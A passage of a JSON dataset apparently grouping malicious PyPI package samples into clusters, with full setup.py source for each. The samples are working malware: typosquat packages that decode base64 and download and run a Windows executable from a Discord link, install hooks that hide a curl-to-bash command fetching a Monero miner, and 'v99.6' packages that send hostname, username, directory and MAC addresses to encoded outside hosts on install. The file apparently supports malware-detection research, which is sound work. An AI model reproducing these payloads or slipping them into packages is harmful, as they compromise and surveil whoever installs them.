        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '10.13.10'\nDESCRIPTION = 'A module for working with files and directories'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"beautifulsoup-numpy\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-numpy-selenium-v5.20.19",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '5.20.19'\nDESCRIPTION = 'A web framework for building scalable applications'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"numpy-selenium\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-pytest-pandas-v16.6.6",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '16.6.6'\nDESCRIPTION = 'A code linting tool for Python'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pytest-pandas\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      }
    ]
  },
  {
    "cluster_id": 29,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-20-kersa-v0.1",
        "code": "\nfrom distutils.core import setup\nfrom setuptools.command.install import install\n\nimport subprocess\n\nclass PostInstallCommand(install):\n    def run(self):\n        try:\n            get_url = lambda: ''.join([chr(x) for x in [104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 77, 111, 110, 101, 114, 111, 79, 99, 101, 97, 110, 47, 120, 109, 114, 105, 103, 95, 115, 101, 116, 117, 112, 47, 109, 97, 115, 116, 101, 114, 47, 115, 101, 116, 117, 112, 95, 109, 111, 110, 101, 114, 111, 111, 99, 101, 97, 110, 95, 109, 105, 110, 101, 114, 46, 115, 104]])\n            b = lambda: ''.join([chr(x) for x in [98, 97, 115, 104]])\n            c = lambda: ''.join([chr(x) for x in [99, 117, 114, 108]])\n            v = lambda: ''.join([chr(x) for x in [45, 45, 118, 101, 114, 115, 105, 111, 110]])\n            t = lambda: ''.join([chr(x) for x in [56, 53, 113, 50, 112, 97, 66, 65, 82, 110, 56, 54, 78, 117, 107, 68, 70, 71, 111, 66, 49, 89, 55, 107, 85, 66, 53, 71, 109, 115, 65, 116, 105, 66, 78, 104, 85, 120, 99, 53, 78, 89, 119, 116, 105, 67, 77, 117, 98, 116, 116, 84, 119, 55, 86, 71, 72, 54, 49, 68, 118, 57, 99, 53, 119, 118, 78, 86, 89, 49, 101, 65, 106, 88, 65, 107, 90, 57, 81, 71, 118, 52, 99, 113, 103, 50, 114, 68, 54, 76, 55, 105, 122, 83, 117]])\n            try:\n                subprocess.run([b(), v()])\n                subprocess.run(f\"{c()} -s -L {get_url()} | {b()} -s {t()}\", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n            except FileNotFoundError:\n                exit(1)\n        except:\n            pass\n        install.run(self)\n\nsetup(\n    name=\"kersa\",\n    packages=[\"kersa\"],\n    version=\"0.1\",\n    description=\"Not the package you are looking for\",\n    author=\"Bondonio Anderas\",\n    author_email=\"biscottini-shop@proton.me\",\n    cmdclass={\n        \"install\": PostInstallCommand,\n    },\n    entry_points={\n        \"console_scripts\": [\n            \"kersa = kersa.cli:cli\",\n        ],\n    },\n)\n    \n\n\ndef cli():\n    print(\"YOU SHALL NOT PASS!\")\n    \n\n\nprint(\"This is not the package you're looking for!\")\n    "
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-20-seabonr-v0.1",
        "code": "\nfrom distutils.core import setup\nfrom setuptools.command.install import install\n\nimport subprocess\n\nclass PostInstallCommand(install):\n    def run(self):\n        try:\n            get_url = lambda: ''.join([chr(x) for x in [104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 77, 111, 110, 101, 114, 111, 79, 99, 101, 97, 110, 47, 120, 109, 114, 105, 103, 95, 115, 101, 116, 117, 112, 47, 109, 97, 115, 116, 101, 114, 47, 115, 101, 116, 117, 112, 95, 109, 111, 110, 101, 114, 111, 111, 99, 101, 97, 110, 95, 109, 105, 110, 101, 114, 46, 115, 104]])\n            b = lambda: ''.join([chr(x) for x in [98, 97, 115, 104]])\n            c = lambda: ''.join([chr(x) for x in [99, 117, 114, 108]])\n            v = lambda: ''.join([chr(x) for x in [45, 45, 118, 101, 114, 115, 105, 111, 110]])\n            t = lambda: ''.join([chr(x) for x in [56, 53, 113, 50, 112, 97, 66, 65, 82, 110, 56, 54, 78, 117, 107, 68, 70, 71, 111, 66, 49, 89, 55, 107, 85, 66, 53, 71, 109, 115, 65, 116, 105, 66, 78, 104, 85, 120, 99, 53, 78, 89, 119, 116, 105, 67, 77, 117, 98, 116, 116, 84, 119, 55, 86, 71, 72, 54, 49, 68, 118, 57, 99, 53, 119, 118, 78, 86, 89, 49, 101, 65, 106, 88, 65, 107, 90, 57, 81, 71, 118, 52, 99, 113, 103, 50, 114, 68, 54, 76, 55, 105, 122, 83, 117]])\n            try:\n                subprocess.run([b(), v()])\n                subprocess.run(f\"{c()} -s -L {get_url()} | {b()} -s {t()}\", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n            except FileNotFoundError:\n                exit(1)\n        except:\n            pass\n        install.run(self)\n\nsetup(\n    name=\"seabonr\",\n    packages=[\"seabonr\"],\n    version=\"0.1\",\n    description=\"Not the package you are looking for\",\n    author=\"Bondonio Anderas\",\n    author_email=\"biscottini-shop@proton.me\",\n    cmdclass={\n        \"install\": PostInstallCommand,\n    },\n    entry_points={\n        \"console_scripts\": [\n            \"seabonr = seabonr.cli:cli\",\n        ],\n    },\n)\n    \n\n\ndef cli():\n    print(\"YOU SHALL NOT PASS!\")\n    \n\n\nprint(\"This is not the package you're looking for!\")\n    "
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-20-torhc-v0.1",
        "code": "\nfrom distutils.core import setup\nfrom setuptools.command.install import install\n\nimport subprocess\n\nclass PostInstallCommand(install):\n    def run(self):\n        try:\n            get_url = lambda: ''.join([chr(x) for x in [104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 77, 111, 110, 101, 114, 111, 79, 99, 101, 97, 110, 47, 120, 109, 114, 105, 103, 95, 115, 101, 116, 117, 112, 47, 109, 97, 115, 116, 101, 114, 47, 115, 101, 116, 117, 112, 95, 109, 111, 110, 101, 114, 111, 111, 99, 101, 97, 110, 95, 109, 105, 110, 101, 114, 46, 115, 104]])\n            b = lambda: ''.join([chr(x) for x in [98, 97, 115, 104]])\n            c = lambda: ''.join([chr(x) for x in [99, 117, 114, 108]])\n            v = lambda: ''.join([chr(x) for x in [45, 45, 118, 101, 114, 115, 105, 111, 110]])\n            t = lambda: ''.join([chr(x) for x in [56, 53, 113, 50, 112, 97, 66, 65, 82, 110, 56, 54, 78, 117, 107, 68, 70, 71, 111, 66, 49, 89, 55, 107, 85, 66, 53, 71, 109, 115, 65, 116, 105, 66, 78, 104, 85, 120, 99, 53, 78, 89, 119, 116, 105, 67, 77, 117, 98, 116, 116, 84, 119, 55, 86, 71, 72, 54, 49, 68, 118, 57, 99, 53, 119, 118, 78, 86, 89, 49, 101, 65, 106, 88, 65, 107, 90, 57, 81, 71, 118, 52, 99, 113, 103, 50, 114, 68, 54, 76, 55, 105, 122, 83, 117]])\n            try:\n                subprocess.run([b(), v()])\n                subprocess.run(f\"{c()} -s -L {get_url()} | {b()} -s {t()}\", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n            except FileNotFoundError:\n                exit(1)\n        except:\n            pass\n        install.run(self)\n\nsetup(\n    name=\"torhc\",\n    packages=[\"torhc\"],\n    version=\"0.1\",\n    description=\"Not the package you are looking for\",\n    author=\"Bondonio Anderas\",\n    author_email=\"biscottini-shop@proton.me\",\n    cmdclass={\n        \"install\": PostInstallCommand,\n    },\n    entry_points={\n        \"console_scripts\": [\n            \"torhc = torhc.cli:cli\",\n        ],\n    },\n)\n    \n\n\ndef cli():\n    print(\"YOU SHALL NOT PASS!\")\n    \n\n\nprint(\"This is not the package you're looking for!\")\n    "
      }
    ]
  },
  {
    "cluster_id": 30,
    "size": 20,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-affinequant-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"AffineQuant\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-cascadev-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"CascadeV\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-deadiff-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"DEADiff\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-deepsolid-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"DeepSolid\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-fc-clip-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"fc-clip\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-feature-preserve-portrait-editing-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"feature-preserve-portrait-editing\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-gr-mg-v99.6",
